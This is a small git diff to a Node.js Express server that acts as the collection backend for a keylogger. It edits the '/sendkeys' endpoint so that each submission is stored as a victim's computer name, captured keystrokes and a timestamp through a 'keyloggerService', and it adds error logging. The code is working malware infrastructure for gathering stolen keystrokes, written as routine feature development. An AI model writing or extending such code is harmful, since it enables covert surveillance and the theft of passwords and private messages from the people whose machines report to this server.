@@ -28,9 +28,15 @@ app.get("/getAllKeys", (req, res) => {
 app.post("/sendkeys", (req, res) => {
   // Placeholder for post mapping.
   try {
-    keyloggerService.saveKeystrokes(req.body);
+    const saveObj = {
+      computerName: req.body.computerName,
+      keystrokes: req.body.keystrokes,
+      timestamp: new Date()
+    };
+    keyloggerService.saveKeystrokes(saveObj);
     res.sendStatus(200);
   } catch(e) {
+    console.log(e);
     res.sendStatus(500);
   }
 });
